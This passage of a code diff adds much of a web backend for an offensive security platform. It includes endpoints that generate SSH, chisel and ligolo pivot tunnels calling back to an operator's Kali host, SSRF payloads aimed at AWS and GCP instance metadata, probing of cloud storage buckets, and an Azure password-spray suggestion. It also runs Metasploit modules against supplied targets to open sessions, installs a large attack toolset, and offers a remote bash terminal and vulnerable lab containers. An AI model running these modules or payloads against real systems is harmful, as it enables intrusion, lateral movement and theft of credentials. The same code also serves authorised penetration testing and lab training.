+                                 "detail": f"{ep} returned {code_tampered}"})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Auth test complete", "detail": "\n".join(raw_parts)})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": "\n".join(raw_parts),
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} auth finding(s)"}
+
+# ══════════════════════════════════════════════════════════════
+#  PIVOT MODULE
+# ══════════════════════════════════════════════════════════════
+
+class PivotRequest(BaseModel):
+    target: str = ""
+    options: dict = {}
+
+@app.post("/api/pivot/ssh_local")
+async def pivot_ssh_local(req: PivotRequest, user=Depends(verify_token)):
+    t = req.target.strip() or "user@pivot_host"
+    rport = req.options.get("remote_port", 3306)
+    lport = req.options.get("local_port", 13306)
+    cmd = f"ssh -N -L {lport}:127.0.0.1:{rport} {t} -o StrictHostKeyChecking=no"
+    findings = [
+        {"severity":"INFO","title":"SSH Local Port Forward Command","detail":cmd},
+        {"severity":"INFO","title":"Usage after tunnel","detail":f"mysql -h 127.0.0.1 -P {lport} -u root -p  # connects to remote MySQL via tunnel"},
+        {"severity":"INFO","title":"nmap through tunnel","detail":f"nmap -sV -p {lport} 127.0.0.1"},
+    ]
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":cmd,"message":"SSH local port forward command generated"}
+
+@app.post("/api/pivot/ssh_dynamic")
+async def pivot_ssh_dynamic(req: PivotRequest, user=Depends(verify_token)):
+    t = req.target.strip() or "user@pivot_host"
+    port = req.options.get("socks_port", 1080)
+    cmd = f"ssh -N -D {port} {t} -o StrictHostKeyChecking=no"
+    findings = [
+        {"severity":"INFO","title":"SSH Dynamic SOCKS5 Proxy","detail":cmd},
+        {"severity":"INFO","title":"proxychains config","detail":f"Edit /etc/proxychains4.conf:\nsocks5 127.0.0.1 {port}"},
+        {"severity":"INFO","title":"Usage","detail":f"proxychains nmap -sT -Pn 10.10.10.1\nproxychains curl http://internal.server\nBrowser proxy: 127.0.0.1:{port}"},
+    ]
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":cmd,"message":"SOCKS5 proxy command generated"}
+
+@app.post("/api/pivot/chisel")
+async def pivot_chisel(req: PivotRequest, user=Depends(verify_token)):
+    kali_ip = req.options.get("kali_ip", "YOUR_KALI_IP")
+    port    = req.options.get("port", 8888)
+    rport   = req.options.get("remote_port", 3306)
+    lport   = req.options.get("local_port", 13306)
+    findings = [
+        {"severity":"INFO","title":"Step 1 - Kali (server)","detail":f"chisel server -p {port} --reverse"},
+        {"severity":"INFO","title":"Step 2 - Target (client)","detail":f"./chisel client {kali_ip}:{port} R:{lport}:127.0.0.1:{rport}"},
+        {"severity":"INFO","title":"Result","detail":f"Kali localhost:{lport} -> Target 127.0.0.1:{rport}\nInstall: apt install chisel"},
+    ]
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":"","message":"Chisel reverse tunnel commands generated"}
+
+@app.post("/api/pivot/proxychains")
+async def pivot_proxychains(req: PivotRequest, user=Depends(verify_token)):
+    proxy_ip   = req.options.get("proxy_ip", "127.0.0.1")
+    proxy_port = req.options.get("proxy_port", 1080)
+    config = f"strict_chain\nproxy_dns\n[ProxyList]\nsocks5  {proxy_ip}  {proxy_port}"
+    findings = [
+        {"severity":"INFO","title":"/etc/proxychains4.conf","detail":config},
+        {"severity":"INFO","title":"nmap through proxy","detail":"proxychains nmap -sT -Pn -p 80,443,22,3306,8080 10.10.10.1"},
+        {"severity":"INFO","title":"curl through proxy","detail":"proxychains curl http://internal-host/admin"},
+        {"severity":"INFO","title":"Metasploit through proxy","detail":"setg Proxies socks5:127.0.0.1:1080\nsetg ReverseAllowProxy true"},
+    ]
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":config,"message":"Proxychains config generated"}
+
+@app.post("/api/pivot/ligolo")
+async def pivot_ligolo(req: PivotRequest, user=Depends(verify_token)):
+    kali_ip = req.options.get("kali_ip", "YOUR_KALI_IP")
+    port    = req.options.get("port", 11601)
+    subnet  = req.options.get("subnet", "10.10.10.0/24")
+    findings = [
+        {"severity":"INFO","title":"Step 1 - Kali: start proxy","detail":f"sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:{port}"},
+        {"severity":"INFO","title":"Step 2 - Target: run agent","detail":f"./agent -connect {kali_ip}:{port} -ignore-cert"},
+        {"severity":"INFO","title":"Step 3 - Kali: add route","detail":f"sudo ip route add {subnet} dev ligolo\n# In ligolo console: session -> start"},
+        {"severity":"INFO","title":"Result","detail":f"Full Layer 3 access to {subnet} - no proxychains needed\nnmap, msf, browser all work natively"},
+    ]
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":"","message":"Ligolo-ng setup commands generated"}
+
+# ══════════════════════════════════════════════════════════════
+#  CLOUD MODULE
+# ══════════════════════════════════════════════════════════════
+
+@app.post("/api/cloud/s3_enum")
+async def cloud_s3_enum(req: PivotRequest, user=Depends(verify_token)):
+    company = req.target.strip().split(".")[0].replace("https://","").replace("http://","")
+    buckets = [company, f"{company}-backup", f"{company}-dev", f"{company}-prod",
+               f"{company}-data", f"{company}-assets", f"{company}-logs", f"{company}-public"]
+    findings = []
+    raw = []
+    for b in buckets:
+        url = f"https://{b}.s3.amazonaws.com"
+        r = await run_tool(["curl","-sk","-o","/dev/null","-w","%{http_code}","--max-time","5",url], timeout=10)
+        code = r.get("output","").strip()
+        raw.append(f"{b}: HTTP {code}")
+        if code == "200":
+            findings.append({"severity":"CRITICAL","title":f"Public S3 Bucket: {b}","detail":f"URL: {url}\nHTTP 200 - publicly readable! Check: aws s3 ls s3://{b} --no-sign-request"})
+        elif code == "403":
+            findings.append({"severity":"MEDIUM","title":f"S3 Bucket Exists (forbidden): {b}","detail":f"Bucket exists. Try: aws s3 ls s3://{b} --no-sign-request"})
+    if not findings:
+        findings.append({"severity":"INFO","title":"No public S3 buckets found","detail":"\n".join(raw)})
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":"\n".join(raw),"message":f"Checked {len(buckets)} S3 bucket names"}
+
+@app.post("/api/cloud/aws_enum")
+async def cloud_aws_enum(req: PivotRequest, user=Depends(verify_token)):
+    target = req.target.strip()
+    findings = []
+    payloads = ["http://169.254.169.254/latest/meta-data/","http://metadata.google.internal/computeMetadata/v1/"]
+    for p in payloads:
+        ssrf_url = f"{target}?url={p}" if target else p
+        r = await run_tool(["curl","-sk","--max-time","5",ssrf_url], timeout=8)
+        out = r.get("output","")
+        if "iam" in out.lower() or "ami-id" in out.lower() or "instance-id" in out.lower():
+            findings.append({"severity":"CRITICAL","title":"AWS Metadata SSRF Confirmed","detail":f"Payload: {p}\nResponse: {out[:500]}"})
+        elif out.strip():
+            findings.append({"severity":"INFO","title":f"SSRF Response","detail":out[:300]})
+    if not findings:
+        findings.append({"severity":"INFO","title":"SSRF Test Complete","detail":"No EC2 metadata exposure detected. Manual: curl http://169.254.169.254/latest/meta-data/ from inside target."})
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":"","message":"AWS metadata SSRF test complete"}
+
+@app.post("/api/cloud/azure_enum")
+async def cloud_azure_enum(req: PivotRequest, user=Depends(verify_token)):
+    domain = req.target.strip().replace("https://","").replace("http://","").split("/")[0]
+    findings = []
+    r2 = await run_tool(["curl","-sk","--max-time","8",f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"],timeout=12)
+    out2 = r2.get("output","")
+    if "authorization_endpoint" in out2.lower():
+        try:
+            j = json.loads(out2)
+            tid = j.get("token_endpoint","").split("/")[3]
+            findings.append({"severity":"LOW","title":"Azure AD Tenant Found","detail":f"Domain: {domain}\nTenant ID: {tid}\nUser enum: o365spray --spray -U users.txt -p Password1 --domain {domain}"})
+        except:
+            findings.append({"severity":"LOW","title":"Azure AD Tenant Found","detail":f"Domain {domain} has Azure AD. Try user enumeration."})
+    else:
+        findings.append({"severity":"INFO","title":"Azure AD Check","detail":f"No Azure AD tenant found for {domain}"})
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":out2[:300],"message":"Azure AD enumeration complete"}
+
+@app.post("/api/cloud/gcp_enum")
+async def cloud_gcp_enum(req: PivotRequest, user=Depends(verify_token)):
+    company = req.target.strip().split(".")[0].replace("https://","").replace("http://","")
+    buckets = [company, f"{company}-backup", f"{company}-data", f"{company}-prod", f"{company}-dev"]
+    findings = []
+    raw = []
+    for b in buckets:
+        url = f"https://storage.googleapis.com/{b}"
+        r = await run_tool(["curl","-sk","-o","/dev/null","-w","%{http_code}","--max-time","5",url],timeout=8)
+        code = r.get("output","").strip()
+        raw.append(f"{b}: {code}")
+        if code == "200":
+            findings.append({"severity":"CRITICAL","title":f"Public GCS Bucket: {b}","detail":f"URL: {url}\nList: gsutil ls gs://{b}"})
+        elif code == "403":
+            findings.append({"severity":"MEDIUM","title":f"GCS Bucket Exists: {b}","detail":f"Try: gsutil ls gs://{b}"})
+    r3 = await run_tool(["curl","-sk","--max-time","3","-H","Metadata-Flavor: Google","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"],timeout=5)
+    if r3.get("output","").strip():
+        findings.append({"severity":"HIGH","title":"GCP Metadata Accessible","detail":r3["output"][:200]})
+    if not findings:
+        findings.append({"severity":"INFO","title":"No public GCS buckets found","detail":", ".join(buckets)})
+    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
+            "raw_output":"\n".join(raw),"message":f"GCP enumeration complete"}
+
+# ══════════════════════════════════════════════════════════════
+#  TOOL MANAGER
+# ══════════════════════════════════════════════════════════════
+
+TOOL_CHECKS = {
+    "nmap":"nmap","masscan":"masscan","amass":"amass","subfinder":"subfinder",
+    "theHarvester":"theHarvester","recon-ng":"recon-ng","spiderfoot":"spiderfoot",
+    "sherlock":"sherlock","dnsrecon":"dnsrecon","dnsx":"dnsx","httpx":"httpx",
+    "wafw00f":"wafw00f","whatweb":"whatweb","nikto":"nikto","gobuster":"gobuster",
+    "ffuf":"ffuf","feroxbuster":"feroxbuster","sqlmap":"sqlmap","nuclei":"nuclei",
+    "dalfox":"dalfox","arjun":"arjun","wfuzz":"wfuzz","wpscan":"wpscan",
+    "msfconsole":"msfconsole","searchsploit":"searchsploit","msfvenom":"msfvenom",
+    "crackmapexec":"crackmapexec","evil-winrm":"evil-winrm",
+    "hashcat":"hashcat","john":"john","hydra":"hydra","medusa":"medusa",
+    "bloodhound":"bloodhound","neo4j":"neo4j","responder":"responder",
+    "aircrack-ng":"aircrack-ng","wifite":"wifite","chisel":"chisel",
+    "socat":"socat","proxychains4":"proxychains4","apktool":"apktool",
+    "jadx":"jadx","frida":"frida","gdb":"gdb","pwntools":"pwn",
+    "ropper":"ropper","binwalk":"binwalk","volatility3":"vol",
+    "exiftool":"exiftool","yara":"yara","trufflehog":"trufflehog",
+    "gitleaks":"gitleaks","semgrep":"semgrep","sublist3r":"sublist3r",
+    "impacket-secretsdump":"impacket-secretsdump","bettercap":"bettercap",
+}
+
+APT_PACKAGES = [
+    "nmap","masscan","amass","theharvester","recon-ng","dnsrecon","wafw00f","whatweb",
+    "nikto","gobuster","ffuf","feroxbuster","sqlmap","wpscan","wfuzz","dirb",
+    "metasploit-framework","exploitdb","crackmapexec","evil-winrm","impacket-scripts",
+    "hashcat","john","hydra","medusa","wordlists",
+    "bloodhound","neo4j","responder","ldapdomaindump",
+    "aircrack-ng","wifite","hostapd","kismet","bettercap",
+    "chisel","socat","proxychains4","sshuttle","ligolo-ng",
+    "apktool","adb","frida-tools","objection",
+    "gdb","pwndbg","checksec","binwalk","foremost","exiftool","yara",
+    "seclists","wordlists","ruby","golang","python3-pip",
+    "neo4j","curl","wget","git","build-essential","gcc-multilib",
+]
+
+GITHUB_TOOLS = [
+    {"name":"pwndbg",      "url":"https://github.com/pwndbg/pwndbg",          "install":"cd /opt/pwndbg && ./setup.sh"},
+    {"name":"gef",         "url":"https://github.com/hugsy/gef",               "install":"pip3 install gef"},
+    {"name":"PEASS-ng",    "url":"https://github.com/carlospolop/PEASS-ng",    "install":""},
+    {"name":"pwncat-cs",   "url":"https://github.com/calebstewart/pwncat",     "install":"cd /opt/pwncat-cs && pip3 install ."},
+    {"name":"ligolo-ng",   "url":"https://github.com/nicocha30/ligolo-ng",     "install":"cd /opt/ligolo-ng && go build -o /usr/local/bin/ligolo-proxy cmd/proxy/main.go"},
+    {"name":"kerbrute",    "url":"https://github.com/ropnop/kerbrute",         "install":"cd /opt/kerbrute && go build -o /usr/local/bin/kerbrute ."},
+    {"name":"chisel",      "url":"https://github.com/jpillora/chisel",         "install":"cd /opt/chisel && go build -o /usr/local/bin/chisel ."},
+    {"name":"subfinder",   "url":"https://github.com/projectdiscovery/subfinder","install":"cd /opt/subfinder && go install ./..."},
+    {"name":"httpx",       "url":"https://github.com/projectdiscovery/httpx",  "install":"cd /opt/httpx && go install ./..."},
+    {"name":"dnsx",        "url":"https://github.com/projectdiscovery/dnsx",   "install":"cd /opt/dnsx && go install ./..."},
+    {"name":"nuclei",      "url":"https://github.com/projectdiscovery/nuclei", "install":"cd /opt/nuclei && go install ./..."},
+    {"name":"dalfox",      "url":"https://github.com/hahwul/dalfox",           "install":"cd /opt/dalfox && go install ."},
+    {"name":"trufflehog",  "url":"https://github.com/trufflesecurity/trufflehog","install":"cd /opt/trufflehog && go install ."},
+    {"name":"gitleaks",    "url":"https://github.com/gitleaks/gitleaks",       "install":"cd /opt/gitleaks && go build -o /usr/local/bin/gitleaks ."},
+    {"name":"sherlock",    "url":"https://github.com/sherlock-project/sherlock","install":"cd /opt/sherlock && pip3 install ."},
+    {"name":"spiderfoot",  "url":"https://github.com/smicallef/spiderfoot",    "install":"cd /opt/spiderfoot && pip3 install -r requirements.txt"},
+    {"name":"impacket",    "url":"https://github.com/fortra/impacket",         "install":"cd /opt/impacket && pip3 install ."},
+    {"name":"pspy",        "url":"https://github.com/DominicBreuker/pspy",     "install":"cd /opt/pspy && go build -o /usr/local/bin/pspy ."},
+]
+
+PIP_TOOLS = [
+    "pwntools","ropper","angr","frida-tools","objection",
+    "impacket","bloodhound","crackmapexec","arjun","scapy",
+    "requests","beautifulsoup4","shodan","censys",
+]
+
+@app.post("/api/msf/run")
+async def msf_run(req: dict, user=Depends(verify_token)):
+    module  = req.get("module","")
+    target  = req.get("target","")
+    lhost   = req.get("lhost","")
+    lport   = req.get("lport", 4444)
+    if not module: return {"error":"Module required"}
+    if not target: return {"error":"Target required"}
+    cmds = (f"use {module}; set RHOSTS {target}; set LHOST {lhost}; set LPORT {lport}; "
+            f"set ExitOnSession false; run -j; sleep 10; sessions -l; exit -y")
+    r = await run_tool(["msfconsole","-q","--no-readline","-x",cmds], timeout=90)
+    out = r.get("output","")
+    opened = bool(re.search(r"session \d+ (opened|created)", out, re.I))
+    return {"output": out[-800:], "session_opened": opened,
+            "message": f"✅ Session opened!" if opened else f"Module ran — no session (check target is vulnerable)"}
+
+@app.post("/api/tools/status")
+async def tools_status(user=Depends(verify_token)):
+    status = {}
+    for tool, cmd in TOOL_CHECKS.items():
+        r = subprocess.run(["which", cmd], capture_output=True)
+        status[tool] = "ok" if r.returncode == 0 else "missing"
+    return {"status": status}
+
+@app.post("/api/tools/install")
+async def tools_install(req: dict, user=Depends(verify_token)):
+    mode = req.get("mode", "all")
+    log = []
+    installed = 0
+
+    env = {**os.environ, "DEBIAN_FRONTEND":"noninteractive", "PYTHONUNBUFFERED":"1"}
+    async def run_cmd(cmd, desc):
+        nonlocal installed
+        log.append(f"🔄 {desc}")
+        try:
+            r = subprocess.run(["bash","-c",cmd], capture_output=True, text=True, timeout=300, env=env)
+            out = (r.stdout+r.stderr).strip()[-150:]
+            if r.returncode == 0:
+                log.append(f"  ✅ Done{(' — '+out) if out else ''}")
+                installed += 1
+            else:
+                log.append(f"  ⚠ {out or 'Error (exit '+str(r.returncode)+')'}")
+        except subprocess.TimeoutExpired:
+            log.append(f"  ⏱ Timeout (continuing)")
+        except Exception as e:
+            log.append(f"  ❌ {e}")
+
+    if mode in ("update","all","upgrade"):
+        log.append("━━━ SYSTEM UPDATE ━━━")
+        await run_cmd("apt-get update -y 2>&1 | tail -3", "apt update")
+        await run_cmd("apt-get upgrade -y 2>&1 | tail -3", "apt upgrade")
+        await run_cmd("apt-get dist-upgrade -y 2>&1 | tail -3", "dist-upgrade")
+        await run_cmd("apt-get autoremove -y 2>&1 | tail -3", "autoremove")
+
+    if mode in ("all",):
+        log.append("━━━ APT PACKAGES ━━━")
+        pkgs = " ".join(APT_PACKAGES)
+        await run_cmd(f"apt-get install -y {pkgs} 2>&1 | tail -5", f"Installing {len(APT_PACKAGES)} apt packages")
+
+        log.append("━━━ PIP TOOLS ━━━")
+        for pkg in PIP_TOOLS:
+            await run_cmd(f"pip3 install --upgrade {pkg} -q 2>&1 | tail -2", f"pip: {pkg}")
+
+    if mode in ("all","github"):
+        log.append("━━━ GITHUB TOOLS ━━━")
+        os.makedirs("/opt", exist_ok=True)
+        for tool in GITHUB_TOOLS:
+            dest = f"/opt/{tool['name']}"
+            if os.path.exists(dest):
+                await run_cmd(f"cd {dest} && git pull 2>&1 | tail -2", f"Update: {tool['name']}")
+            else:
+                await run_cmd(f"git clone --depth=1 {tool['url']} {dest} 2>&1 | tail -2", f"Clone: {tool['name']}")
+            if tool["install"]:
+                await run_cmd(tool["install"] + " 2>&1 | tail -3", f"Build: {tool['name']}")
+
+        # Go tools via go install
+        go_tools = [
+            "github.com/OJ/gobuster/v3@latest",
+            "github.com/ffuf/ffuf/v2@latest",
+            "github.com/tomnomnom/waybackurls@latest",
+            "github.com/tomnomnom/anew@latest",
+            "github.com/tomnomnom/qsreplace@latest",
+            "github.com/tomnomnom/gf@latest",
+        ]
+        for gt in go_tools:
+            name = gt.split("/")[-1].split("@")[0]
+            await run_cmd(f"go install {gt} 2>&1 | tail -2", f"go install: {name}")
+
+    if mode == "upgrade":
+        log.append("━━━ UPGRADE INSTALLED ━━━")
+        await run_cmd("apt-get upgrade -y 2>&1 | tail -5", "apt upgrade all")
+        await run_cmd("pip3 list --outdated --format=freeze 2>/dev/null | cut -d= -f1 | xargs -r pip3 install --upgrade -q", "pip upgrade all")
+        for tool in GITHUB_TOOLS:
+            dest = f"/opt/{tool['name']}"
+            if os.path.exists(dest):
+                await run_cmd(f"cd {dest} && git pull 2>&1 | tail -2", f"Update: {tool['name']}")
+
+    log.append(f"✅ Complete — {installed} operations succeeded")
+    return {"log": log, "installed": installed}
+
+# ══════════════════════════════════════════════════════════════
+#  EMBEDDED TERMINAL (PTY sessions)
+# ══════════════════════════════════════════════════════════════
+import pty as _pty_mod, select as _sel_mod, termios as _tios_mod, fcntl as _fcntl_mod
+
+_pty_sessions = {}  # sid -> {master, proc, buf}
+
+@app.post("/api/terminal/create")
+async def terminal_create(user=Depends(verify_token)):
+    import uuid
+    sid = uuid.uuid4().hex[:8]
+    master, slave = _pty_mod.openpty()
+    proc = subprocess.Popen(
+        ["bash","--norc","--noprofile"],
+        stdin=slave, stdout=slave, stderr=slave,
+        preexec_fn=os.setsid, close_fds=True
+    )
+    os.close(slave)
+    import fcntl, termios
+    flags = fcntl.fcntl(master, fcntl.F_GETFL)
+    fcntl.fcntl(master, fcntl.F_SETFL, flags | os.O_NONBLOCK)
+    _pty_sessions[sid] = {"master": master, "proc": proc, "buf": ""}
+    return {"session_id": sid, "ok": True}
+
+@app.post("/api/terminal/input")
+async def terminal_input(req: dict, user=Depends(verify_token)):
+    sid = req.get("session_id","")
+    cmd = req.get("input","")
+    if sid not in _pty_sessions:
+        return {"ok": False, "error": "Session not found"}
+    try:
+        os.write(_pty_sessions[sid]["master"], (cmd + "\n").encode())
+        return {"ok": True}
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
+@app.post("/api/terminal/output")
+async def terminal_output(req: dict, user=Depends(verify_token)):
+    sid = req.get("session_id","")
+    if sid not in _pty_sessions:
+        return {"output": "", "new": "", "error": "Session not found"}
+    master = _pty_sessions[sid]["master"]
+    new_out = ""
+    import re as _re2
+    try:
+        # Drain all available output instantly
+        chunks = []
+        for _ in range(20):  # max 20 reads per call
+            r,_,_ = _sel_mod.select([master],[],[],0.02)
+            if not r: break
+            try:
+                chunk = os.read(master, 8192)
+                if not chunk: break
+                chunks.append(chunk)
+            except BlockingIOError:
+                break
+        if chunks:
+            raw = b"".join(chunks).decode("utf-8", errors="replace")
+            # Strip ANSI escape codes
+            raw = _re2.sub(r'\x1b\[[0-9;]*[mABCDEFGHJKLMnsuhl]', '', raw)
+            raw = _re2.sub(r'\x1b\[?\??[0-9;]*[lh]', '', raw)
+            raw = _re2.sub(r'\x1b\][^\x07]*\x07', '', raw)  # OSC sequences
+            raw = _re2.sub(r'\r', '', raw)  # carriage returns
+            _pty_sessions[sid]["buf"] += raw
+            new_out = raw
+    except Exception:
+        pass
+    return {"new": new_out}
+
+@app.post("/api/terminal/close")
+async def terminal_close(req: dict, user=Depends(verify_token)):
+    sid = req.get("session_id","")
+    if sid in _pty_sessions:
+        try:
+            _pty_sessions[sid]["proc"].kill()
+            os.close(_pty_sessions[sid]["master"])
+        except: pass
+        del _pty_sessions[sid]
+    return {"ok": True}
+
+# ══════════════════════════════════════════════════════════════
+#  LAB MANAGER — Docker-based vulnerable targets
+# ══════════════════════════════════════════════════════════════
+
+LAB_TARGETS = [
+    {"id":"dvwa",       "name":"DVWA",              "image":"vulnerables/web-dvwa",    "port":8001, "internal":80,  "proto":"http", "category":"Web App",    "desc":"Damn Vulnerable Web Application — SQL injection, XSS, CSRF, file upload, command injection", "creds":"admin/password", "icon":"🌐"},
+    {"id":"webgoat",    "name":"WebGoat",            "image":"webgoat/webgoat",         "port":8002, "internal":8080,"proto":"http", "category":"Web App",    "desc":"OWASP WebGoat — interactive web security lessons covering OWASP Top 10",                     "creds":"guest/guest",    "icon":"🐐"},
+    {"id":"juiceshop",  "name":"OWASP Juice Shop",   "image":"bkimminich/juice-shop",   "port":8003, "internal":3000,"proto":"http", "category":"Web App",    "desc":"Modern vulnerable web app — 100+ challenges covering XSS, SQLi, auth bypass, SSRF",         "creds":"admin@juice-sh.op/admin123","icon":"🧃"},
+    {"id":"mutillidae", "name":"Mutillidae II",       "image":"webpwnized/mutillidae",   "port":8004, "internal":80,  "proto":"http", "category":"Web App",    "desc":"NOWASP Mutillidae — 40+ vulnerabilities, all OWASP categories",                             "creds":"admin/adminpass","icon":"🦟"},
+    {"id":"bwapp",      "name":"bWAPP",               "image":"raesene/bwapp",           "port":8005, "internal":80,  "proto":"http", "category":"Web App",    "desc":"Buggy Web Application — 100+ web bugs, PHP/MySQL based",                                     "creds":"bee/bug",        "icon":"🐛"},
+    {"id":"nodegoat",   "name":"NodeGoat",            "image":"owasp/nodegoat",          "port":8007, "internal":4000,"proto":"http", "category":"Web App",    "desc":"OWASP NodeGoat — Node.js/Express vulnerabilities, A1-A10",                                  "creds":"admin@nodegoat.com/Admin1234!","icon":"🟢"},
+    {"id":"vulnserver",  "name":"VulnServer (BOF)",   "image":"",                        "port":9999, "internal":9999,"proto":"tcp",  "category":"Binary Exploit","desc":"Custom C server vulnerable to buffer overflow — practice EIP control, JMP ESP, shellcode",  "creds":"N/A",            "icon":"💣"},
+]
+
+@app.get("/api/lab/targets")
+async def lab_targets(user=Depends(verify_token)):
+    results = []
+    for t in LAB_TARGETS:
+        status = "stopped"
+        if t["image"]:
+            r = subprocess.run(["docker","inspect","--format","{{.State.Running}}",f"lab_{t['id']}"],
+                               capture_output=True, text=True)
+            status = "running" if r.stdout.strip()=="true" else "stopped"
+        else:
+            # Check vulnserver by port
+            import socket as _sock2
+            try:
+                s = _sock2.socket(); s.settimeout(1); s.connect(("127.0.0.1",t["port"])); s.close()
+                status = "running"
+            except: status = "stopped"
+        results.append({**t, "status": status})
+    return {"targets": results}
+
+@app.post("/api/lab/start")
+async def lab_start(req: dict, user=Depends(verify_token)):
+    tid = req.get("id","")
+    t = next((x for x in LAB_TARGETS if x["id"]==tid), None)
+    if not t: return {"ok":False,"error":"Unknown target"}
+
+    if tid == "vulnserver":
+        binary = "/tmp/vulnserver"
+        _ensure_vulnserver(binary)
+        subprocess.run(["pkill","-f","vulnserver"], capture_output=True)
+        await asyncio.sleep(0.3)
+        subprocess.Popen([binary], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        await asyncio.sleep(1)
+        return {"ok":True,"message":f"VulnServer started on port 9999"}
+
+    r = subprocess.run(
+        ["docker","run","-d","--rm","--name",f"lab_{tid}",
+         "-p",f"{t['port']}:{t['internal']}", t["image"]],
+        capture_output=True, text=True)
+    if r.returncode == 0 or "already in use" in r.stderr:
+        return {"ok":True,"message":f"{t['name']} started on port {t['port']}","url":f"http://KALI_IP:{t['port']}"}
+    return {"ok":False,"error":r.stderr.strip()[:200]}
+
+@app.post("/api/lab/stop")
+async def lab_stop(req: dict, user=Depends(verify_token)):
+    tid = req.get("id","")
+    t = next((x for x in LAB_TARGETS if x["id"]==tid), None)
+    if not t: return {"ok":False,"error":"Unknown target"}
+    if tid == "vulnserver":
+        subprocess.run(["pkill","-f","vulnserver"], capture_output=True)
+        return {"ok":True,"message":"VulnServer stopped"}
+    r = subprocess.run(["docker","stop",f"lab_{tid}"], capture_output=True, text=True)
+    return {"ok": r.returncode==0, "message": f"{t['name']} stopped"}
+
+@app.post("/api/lab/start_all")
+async def lab_start_all(user=Depends(verify_token)):
+    log = []
+    for t in LAB_TARGETS:
+        if not t["image"]:
+            binary = "/tmp/vulnserver"
+            _ensure_vulnserver(binary)
+            subprocess.Popen([binary], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            log.append(f"✅ VulnServer started on :9999")
+            continue
+        r = subprocess.run(
+            ["docker","run","-d","--rm","--name",f"lab_{t['id']}",
+             "-p",f"{t['port']}:{t['internal']}", t["image"]],
+            capture_output=True, text=True)
+        if r.returncode == 0:
+            log.append(f"✅ {t['name']} started → http://KALI_IP:{t['port']}")
+        elif "already in use" in r.stderr or "already exists" in r.stderr:
+            log.append(f"ℹ {t['name']} already running on :{t['port']}")
+        else:
+            log.append(f"❌ {t['name']} failed: {r.stderr.strip()[:80]}")
+        await asyncio.sleep(0.2)
+    return {"ok":True,"log":log}
